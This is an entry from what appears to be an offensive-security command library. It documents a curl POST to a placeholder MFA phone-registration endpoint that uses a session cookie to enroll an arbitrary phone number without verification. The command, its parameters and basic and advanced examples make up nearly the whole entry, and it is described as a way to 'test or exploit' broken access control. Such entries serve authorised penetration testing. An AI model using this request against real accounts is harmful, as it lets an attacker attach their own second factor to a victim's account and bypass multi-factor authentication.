---
id: cmd-curl-mfa-reg-001
data: >-
  curl -X POST https://api.target.com/mfa/register-phone -H "Cookie:
  session=<valid_session_cookie>" -H "Content-Type: application/json" -d
  '{"phone_number": "+15551234567"}' --insecure
tags:
  - web
  - api
  - mfa
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:47.671Z'
verified: false
validated: true
submitted: true
---
# curl-mfa-register

## Command

```bash
curl -X POST https://api.target.com/mfa/register-phone \
  -H "Cookie: session=<valid_session_cookie>" \
  -H "Content-Type: application/json" \
  -d '{"phone_number": "+15551234567"}' \
  --insecure
```

## Description

This command uses curl to send a POST request to the MFA phone registration endpoint, registering an arbitrary phone number without verification. It is used to test or exploit improper access control in web applications supporting MFA.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://api.target.com/mfa/register-phone` | Target endpoint URL | Yes |
| `-H "Cookie: session=<valid_session_cookie>"` | Authentication header with session | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload format | Yes |
| `-d '{"phone_number": "+15551234567"}'` | JSON data with arbitrary phone | Yes |
| `--insecure` | Skips SSL verification (for testing) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://api.target.com/mfa/register-phone -H "Cookie: session=abc123" -d '{"phone_number": "+15551234567"}'
```

### Advanced Usage

```bash
curl -X POST https://api.target.com/mfa/register-phone \
  -H "Cookie: session=abc123" \
  -H "Content-Type: application/json" \
  -d '{"phone_number": "+15551234567", "country_code": "US"}' \
  -v
```

## Expected Output

Successful execution returns an HTTP 200 response with JSON like {"status": "success", "message": "Phone number registered"}. Failure might show 403 or 401 if session is invalid.

## Related

- [[Related Procedure|procedures/Register-Arbitrary-MFA-Phone-Number]]
